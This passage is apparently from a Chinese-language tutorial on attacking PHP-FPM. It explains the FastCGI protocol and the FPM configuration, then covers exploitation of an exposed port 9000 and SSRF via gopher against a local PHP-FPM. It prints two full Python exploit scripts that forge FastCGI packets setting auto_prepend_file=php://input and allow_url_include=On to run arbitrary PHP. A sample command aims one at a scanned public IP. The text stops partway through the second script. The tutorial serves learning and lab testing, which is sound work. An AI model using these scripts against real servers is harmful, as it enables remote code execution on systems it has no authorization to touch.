语言端解析了fastcgi头以后，拿到contentLength，然后再在TCP流里读取大小等于contentLength的数据，这就是body体。 Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用。不需要该Padding的时候，将其长度设置为0即可。 可见，一个fastcgi record结构最大支持的body大小是2^16，也就是65536字节。 type type就是指定该record的作用。因为FastCGI一个record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个record。通过type来标志每个record的作用，用requestId作为同一次请求的id。 也就是说，每次请求，会有多个record，他们的requestId是相同的。 主要的几种type类型如下图： 服务器中间件和PHP-FPM通信的第一个数据包是type为1的record，而后续通信的type为4、5、6、7的record，结束时发送type为2、3的record。 这里我们重点关注type为4的record，因为后面的漏洞利用涉及到这块。 当后端语言接收到一个type为4的record后，就会把这个record的body按照对应的结构解析成key-value对，这就是环境变量。环境变量的结构如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344&gt; typedef struct &#123;&gt; unsigned char nameLengthB0; /* nameLengthB0 &gt;&gt; 7 == 0 */&gt; unsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */&gt; unsigned char nameData[nameLength];&gt; unsigned char valueData[valueLength];&gt; &#125; FCGI_NameValuePair11;&gt; &gt; typedef struct &#123;&gt; unsigned char nameLengthB0; /* nameLengthB0 &gt;&gt; 7 == 0 */&gt; unsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */&gt; unsigned char valueLengthB2;&gt; unsigned char valueLengthB1;&gt; unsigned char valueLengthB0;&gt; unsigned char nameData[nameLength];&gt; unsigned char valueData[valueLength&gt; ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];&gt; &#125; FCGI_NameValuePair14;&gt; &gt; typedef struct &#123;&gt; unsigned char nameLengthB3; /* nameLengthB3 &gt;&gt; 7 == 1 */&gt; unsigned char nameLengthB2;&gt; unsigned char nameLengthB1;&gt; unsigned char nameLengthB0;&gt; unsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */&gt; unsigned char nameData[nameLength&gt; ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];&gt; unsigned char valueData[valueLength];&gt; &#125; FCGI_NameValuePair41;&gt; &gt; typedef struct &#123;&gt; unsigned char nameLengthB3; /* nameLengthB3 &gt;&gt; 7 == 1 */&gt; unsigned char nameLengthB2;&gt; unsigned char nameLengthB1;&gt; unsigned char nameLengthB0;&gt; unsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */&gt; unsigned char valueLengthB2;&gt; unsigned char valueLengthB1;&gt; unsigned char valueLengthB0;&gt; unsigned char nameData[nameLength&gt; ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];&gt; unsigned char valueData[valueLength&gt; ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];&gt; &#125; FCGI_NameValuePair44;&gt; 这其实是4个结构，至于用哪个结构，有如下规则： key、value均小于128字节，用FCGI_NameValuePair11 key大于128字节，value小于128字节，用FCGI_NameValuePair41 key小于128字节，value大于128字节，用FCGI_NameValuePair14 key、value均大于128字节，用FCGI_NameValuePair44 举个例子，用户访问http://127.0.0.1/index.php?a=1&amp;b=2，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对，即此时FastCGI协议包record的type为4： 12345678910111213141516&#123; &apos;GATEWAY_INTERFACE&apos;: &apos;FastCGI/1.0&apos;, &apos;REQUEST_METHOD&apos;: &apos;GET&apos;, &apos;SCRIPT_FILENAME&apos;: &apos;/var/www/html/index.php&apos;, &apos;SCRIPT_NAME&apos;: &apos;/index.php&apos;, &apos;QUERY_STRING&apos;: &apos;?a=1&amp;b=2&apos;, &apos;REQUEST_URI&apos;: &apos;/index.php?a=1&amp;b=2&apos;, &apos;DOCUMENT_ROOT&apos;: &apos;/var/www/html&apos;, &apos;SERVER_SOFTWARE&apos;: &apos;php/fcgiclient&apos;, &apos;REMOTE_ADDR&apos;: &apos;127.0.0.1&apos;, &apos;REMOTE_PORT&apos;: &apos;12345&apos;, &apos;SERVER_ADDR&apos;: &apos;127.0.0.1&apos;, &apos;SERVER_PORT&apos;: &apos;80&apos;, &apos;SERVER_NAME&apos;: &quot;localhost&quot;, &apos;SERVER_PROTOCOL&apos;: &apos;HTTP/1.1&apos;&#125; 这个数组其实就是PHP中$_SERVER数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充$_SERVER数组，也是告诉fpm：“我要执行哪个PHP文件”。 PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是/var/www/html/index.php。 有个注意点，就是PHP 5.3.9之后加入了FPM增加了security.limit_extensions选项，这个选项默认只解析.php文件，具体的在下一小节说到。 0x03 FPM基本概念 官方定义如下： FPM（FastCGI 进程管理器）用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。 简单地说，FPM是实现和管理FastCGI进程的管理器，能够接收服务器中间件发送的FastCGI协议包并进行解析、最后将解析结果返回给服务器中间件。 这里借用先知的一个图来看看就清楚了： 通信方式在PHP使用FastCGI连接模式的情况下，Web服务器中间件如Nginx和PHP-FPM之间的通信方式又分为两种： TCP模式TCP模式即是PHP-FPM进程会监听本机上的一个端口（默认为9000），然后Nginx会把客户端数据通过FastCGI协议传给9000端口，PHP-FPM拿到数据后会调用CGI进程解析。 通常我们可以通过查看Nginx的配置文件default.conf来确认是否是TCP模式，这里个人环境中的路径为/etc/nginx/conf.d/default.conf，关注fastcgi_pass这一项，若为ip+port的形式即为TCP模式： 1234567location ~ \\.php$ &#123; index index.php index.html index.htm; include /etc/nginx/fastcgi_params; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi_params; &#125; 在PHP-FPM中，可以通过查看其配置文件，个人环境中的路径为/usr/local/etc/php-fpm.d/www.conf，看到listen一项若为ip+port的形式即为TCP模式： 1234567891011; The address on which to accept FastCGI requests.; Valid syntaxes are:; &apos;ip.add.re.ss:port&apos; - to listen on a TCP socket to a specific IPv4 address on; a specific port;; &apos;[ip:6:addr:ess]:port&apos; - to listen on a TCP socket to a specific IPv6 address on; a specific port;; &apos;port&apos; - to listen on a TCP socket to all addresses; (IPv6 and IPv4-mapped) on a specific port;; &apos;/path/to/unix/socket&apos; - to listen on a unix socket.; Note: This value is mandatory.listen = 127.0.0.1:9000 Unix Socket模式Unix套接字模式是Unix系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是.sock）作为socket的唯一标识（描述符），需要通信的两个进程引用同一个socket描述符文件就可以建立通道进行通信了。 相比之下，Unix套接字模式的性能会优于TCP模式。 还是一样的识别方法，在Nginx的default.conf中查看fastcgi_pass： 1234567location~\\.php$&#123; index index.php index.html index.htm; include /etc/nginx/fastcgi_params; fastcgi_pass unix:/run/php/php7.3-fpm.sock; fastcgi_index index.php; include fastcgi_params;&#125; 在PHP-FPM的www.conf中查看listen： 1listen = /run/php/php7.3-fpm.sock security.limit_extensions在PHP 5.3.9版本之后，PHP-FPM新添了security.limit_extensions选项，它是PHP-FPM配置文件中的一个选项，主要是用来限制能够解析的文件后缀名（默认值为php），可有效防御住Nginx解析漏洞。 我们可以自行查看PHP-FPM环境中security.limit_extensions的设置值，个人环境中的路径为/usr/local/etc/php-fpm.d/www.conf： 1234567; Limits the extensions of the main script FPM will allow to parse. This can; prevent configuration mistakes on the web server side. You should only limit; FPM to .php extensions to prevent malicious users to use other extensions to; execute php code.; Note: set an empty value to allow all extensions.; Default Value: .php;security.limit_extensions = .php .php3 .php4 .php5 .php7 为什么会提到这个设置项呢？ 这是因为在后面的漏洞利用中，正是这个PHP-FPM的设置，导致我们只能使用Web服务器本身已存在的PHP文件进行利用，具体的原理后面会说到。 环境搭建具体的环境搭建这篇文章写得很详细：https://xz.aliyun.com/t/5598#toc-3 本人用的是P牛的docker环境直接搭建，非常方便，git clone下来之后直接docker-compose up -d即可运行： https://github.com/vulhub/vulhub/tree/master/fpm 0x04 PHP-FPM未授权访问漏洞基本原理顾名思义，PHP-FPM未授权访问漏洞，就是PHP-FPM的服务端口绑定在全网监听而非绑定在本地127.0.0.1的端口上，从而导致攻击者可以从公网通过构造FastCGI报文来攻击PHP-FPM，进而导致任意代码执行。 我们先看下我们漏洞环境的PHP-FPM的通信模式和是否是在全网监听端口： :::9000为IPv6形式的全网监听9000端口的意思，说明通信模式是TCP模式且是全网监听9000端口的。 既然PHP-FPM暴露在公网了，那我们就想着如何去攻击这个服务。 攻击手段很明显，就是伪造FastCGI协议报文发送过去给PHP-FPM服务，进而达到任意代码执行的效果。 注意的就是，除disable_function以外的大部分PHP配置，我们都可以通过FastCGI协议包来更改，具体的可参考php手册：https://www.php.net/manual/zh/ini.list.php 那么如何实现任意代码执行呢？ FastCGI协议只可以传输配置信息及需要被执行的文件名及客户端传进来的GET、POST、Cookie等数据。看上去我们即使能传输任意协议包也不能任意代码执行，但是我们可以通过更改配置信息来执行任意代码。 auto_prepend_file和auto_append_file这两个选项是php.ini中年的两个可利用的选项。 auto_prepend_file选项是告诉PHP在执行目标文件之前，先包含auto_prepend_file中指定的文件，并且auto_prepend_file可以使用PHP伪协议；auto_append_file选项同理，区别在于执行目标文件之后才会包含指定文件。 此时，我们可以将auto_prepend_file的值设置为php://input伪协议，其可通过POST的方式将我们的数据传进来，那么就等于在执行任何php文件前都要包含一遍POST的内容。因此，我们只需要把待执行的代码放在Body中就可以实现任意代码执行了。 接着又一个问题，我们怎么设置auto_prepend_file的值呢？此外，php://input伪协议也是需要开启allow_url_include选项的，那又在哪里设置开启呢？ PHP_VALUE和PHP_ADMIN_VALUEPHP_VALUE和PHP_ADMIN_VALUE是PHP-FPM的两个环境变量。PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项，PHP_ADMIN_VALUE可以设置所有选项（disable_functions除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）。 由前面分析的FastCGI协议知道，type为4的record是键值对的形式，因此我们可以直接在报文中添加这两个PHP-FPM的环境变量来进行设置： 123456789101112131415161718&#123; &apos;GATEWAY_INTERFACE&apos;: &apos;FastCGI/1.0&apos;, &apos;REQUEST_METHOD&apos;: &apos;GET&apos;, &apos;SCRIPT_FILENAME&apos;: &apos;/var/www/html/index.php&apos;, &apos;SCRIPT_NAME&apos;: &apos;/index.php&apos;, &apos;QUERY_STRING&apos;: &apos;?a=1&amp;b=2&apos;, &apos;REQUEST_URI&apos;: &apos;/index.php?a=1&amp;b=2&apos;, &apos;DOCUMENT_ROOT&apos;: &apos;/var/www/html&apos;, &apos;SERVER_SOFTWARE&apos;: &apos;php/fcgiclient&apos;, &apos;REMOTE_ADDR&apos;: &apos;127.0.0.1&apos;, &apos;REMOTE_PORT&apos;: &apos;12345&apos;, &apos;SERVER_ADDR&apos;: &apos;127.0.0.1&apos;, &apos;SERVER_PORT&apos;: &apos;80&apos;, &apos;SERVER_NAME&apos;: &quot;localhost&quot;, &apos;SERVER_PROTOCOL&apos;: &apos;HTTP/1.1&apos; &apos;PHP_VALUE&apos;: &apos;auto_prepend_file = php://input&apos;, &apos;PHP_ADMIN_VALUE&apos;: &apos;allow_url_include = On&apos;&#125; 设置auto_prepend_file = php://input且allow_url_include = On，然后将我们需要执行的代码放在Body中，即可执行任意代码。 另外，SCRIPT_FILENAME选项需要我们设置一个服务端已存在的PHP文件，该选项是让PHP-FPM执行目标服务器上的文件，且由于security.limit_extensions项的限制导致只能执行PHP文件。 如何找一个已存在的且通用的PHP文件来利用呢？ 查找PHP默认安装的php文件我们搜索下漏洞环境中已有的PHP文件，找一下PHP安装过程中默认存在的PHP文件即可： 非常多，这里我们挑一个常见的/usr/local/lib/php/PEAR.php。 EXP脚本分析好了，基本的原理大概都说明了，下面看下P牛写的利用脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252import socketimport randomimport argparseimport sysfrom io import BytesIO# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i])def bord(c): if isinstance(c, int): return c else: return ord(c)def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode('utf-8', 'strict')def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, 'utf-8', 'strict') else: s = str(s) return sclass FastCGIClient: \"\"\"A Fast-CGI Client for Python\"\"\" # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b'' if nLen &lt; 128: record += bchr(nLen) else: record += bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record += bchr(vLen) else: record += bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header['version'] = bord(stream[0]) header['type'] = bord(stream[1]) header['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header['paddingLength'] = bord(stream[6]) header['reserved'] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record['content'] = b'' if 'contentLength' in record.keys(): contentLength = int(record['contentLength']) record['content'] += buffer.read(contentLength) if 'paddingLength' in record.keys(): skiped = buffer.read(int(record['paddingLength'])) return record def request(self, nameValuePairs=&#123;&#125;, post=''): if not self.__connect(): print('connect failure! please check your fasctcgi-server !!') return requestId = random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] = dict() request = b\"\" beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b'' if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId) self.sock.send(request) self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND self.requests[requestId]['response'] = b'' return self.__waitForResponse(requestId) def __waitForResponse(self, requestId): data = b'' while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response['requestId']): self.requests[requestId]['response'] += response['content'] if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId]['response'] def __repr__(self): return \"fastcgi connect host:&#123;&#125; port:&#123;&#125;\".format(self.host, self.port)if __name__ == '__main__': parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.') parser.add_argument('host', help='Target host, such as 127.0.0.1') parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php') parser.add_argument('-c', '--code', help='What php code your want to execute', default='&lt;?php phpinfo(); exit; ?&gt;') parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = \"/\" uri = args.file content = args.code params = &#123; 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'POST', 'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'), 'SCRIPT_NAME': uri, 'QUERY_STRING': '', 'REQUEST_URI': uri, 'DOCUMENT_ROOT': documentRoot, 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '9985', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1', 'CONTENT_TYPE': 'application/text', 'CONTENT_LENGTH': \"%d\" % len(content), 'PHP_VALUE': 'auto_prepend_file = php://input', 'PHP_ADMIN_VALUE': 'allow_url_include = On' &#125; response = client.request(params, content) print(force_text(response)) 前面的大部分代码都是编写FastCGI客户端的，是参照Github上已经造好的轮子，这里不多说：https://github.com/wuyunfeng/Python-FastCGI-Client 我们分析下主要的代码逻辑：程序解析完输入参数后，新建一个FastCGI客户端连接，接着重点是构造下面的报文： 1234567891011121314151617181920&#123; &apos;GATEWAY_INTERFACE&apos;: &apos;FastCGI/1.0&apos;, &apos;REQUEST_METHOD&apos;: &apos;POST&apos;, &apos;SCRIPT_FILENAME&apos;: documentRoot + uri.lstrip(&apos;/&apos;), &apos;SCRIPT_NAME&apos;: uri, &apos;QUERY_STRING&apos;: &apos;&apos;, &apos;REQUEST_URI&apos;: uri, &apos;DOCUMENT_ROOT&apos;: documentRoot, &apos;SERVER_SOFTWARE&apos;: &apos;php/fcgiclient&apos;, &apos;REMOTE_ADDR&apos;: &apos;127.0.0.1&apos;, &apos;REMOTE_PORT&apos;: &apos;9985&apos;, &apos;SERVER_ADDR&apos;: &apos;127.0.0.1&apos;, &apos;SERVER_PORT&apos;: &apos;80&apos;, &apos;SERVER_NAME&apos;: &quot;localhost&quot;, &apos;SERVER_PROTOCOL&apos;: &apos;HTTP/1.1&apos;, &apos;CONTENT_TYPE&apos;: &apos;application/text&apos;, &apos;CONTENT_LENGTH&apos;: &quot;%d&quot; % len(content), &apos;PHP_VALUE&apos;: &apos;auto_prepend_file = php://input&apos;, &apos;PHP_ADMIN_VALUE&apos;: &apos;allow_url_include = On&apos;&#125; 这里环境变量的设置按照前面分析的来就可以了，SCRIPT_NAME设置的是我们输入的PHP文件的参数如/usr/local/lib/php/PEAR.php，PHP_VALUE设置auto_prepend_file = php://input，PHP_ADMIN_VALUE设置allow_url_include = On。 报文参数设置完之后，带上用户参数输入的作为POST的Body内容向暴露于公网的PHP-FPM服务发送该FastCGI报文即可实现攻击利用。 攻击利用现在我们以攻击者的角度来进行攻击利用。 首先攻击者用nmap等端口扫描工具批量扫描，发现某台公网IP开启了9000端口： 然后简单粗暴地应用P牛的脚本直接打，即可执行远程代码： python .\\fpm.py -c &#39;&lt;?php echoid;exit;?&gt;&#39; 1.1.1.1 /usr/local/lib/php/PEAR.php 对比下就知道，可能漏洞利用原理较复杂，但靠着脚本工具的利用就是分分钟的事。 0x05 SSRF攻击本地PHP-FPM基本原理PHP-FPM开放在公网上的情况是很少的，大部分时候都是启动在本地即监听127.0.0.1:9000地址的。 虽然我们没有办法直接对PHP-FPM发起攻击，但是我们可以结合其他漏洞来间接利用。如果目标站点存在SSRF漏洞，那么我们就可以借助SSRF来攻击本地PHP-FPM服务，达到任意代码执行的效果。 Gopher协议Gopher协议在SSRF利用中被广泛运用，其URL格式如下： 1gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流 也就是说，通过Gopher协议，我们可以直接发送TCP协议流，从中进行urlencode编码来构造SSRF攻击代码，其中攻击代码就是恶意FastCGI协议报文。 Exp脚本分析那么Exp如何修改呢？ 在P牛脚本的基础上进行修改，代码来自：https://cloud.tencent.com/developer/article/1425023 修改点在于：将原本的FastCGI客户端类中request()方法中的发送请求的代码注释掉，因为这里FPM并没有启在公网；接着，在最后的主程序逻辑中修改最后两行代码为在调用前面修改过的request()函数来获取返回的TCP流，对该返回数据进行URL编码然后拼接成Gopher协议的形式即可。 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255import socketimport base64import randomimport argparseimport sysfrom io import BytesIOimport urllib# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client PY2 = True if sys.version_info.major == 2 else False def bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i]) def bord(c): if isinstance(c, int): return c else: return ord(c) def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode('utf-8', 'strict') def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, 'utf-8', 'strict') else: s = str(s) return s class FastCGIClient: \"\"\"A Fast-CGI Client for Python\"\"\" # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b'' if nLen &lt; 128: record += bchr(nLen) else: record += bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record += bchr(vLen) else: record += bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header['version'] = bord(stream[0]) header['type'] = bord(stream[1]) header['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header['paddingLength'] = bord(stream[6]) header['reserved'] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record['content'] = b'' if 'contentLength' in record.keys(): contentLength = int(record['contentLength']) record['content'] += buffer.read(contentLength) if 'paddingLength' in record.keys(): skiped = buffer.read(int(record['paddingLength'])) return record def request(self, nameValuePairs=&#123;&#125;, post=''): # if not self.__connect(): # print('connect failure! please check your fasctcgi-server !!') # return requestId = random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] = dict() request = b\"\" beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b'' if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId) #print base64.b64encode(request) return request # self.sock.send(request) # self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND # self.requests[requestId]['response'] = b'' # return self.__waitForResponse(requestId) def __waitForResponse(self, requestId): data = b'' while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response['requestId']): self.requests[requestId]['response'] += response['content'] if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId]['response'] def __repr__(self): return \"fastcgi connect host:&#123;&#125; port:&#123;&#125;\".format(self.host, self.port) if __name__ == '__main__': parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.') parser.add_argument('host', help='Target host, such as 127.0.0.1') parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php') parser.add_argument('-c', '--code', help='What php code your want to execute', default='&lt;?php phpinfo(); exit; ?&gt;') parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = \"/\" uri = args.file content = args.code params = &#123; 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'POST', 'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'), 'SCRIPT_NAME': uri, 'QUERY_STRING': '', 'REQUEST_URI': uri, 'DOCUMENT_ROOT': documentRoot, 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '9985', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 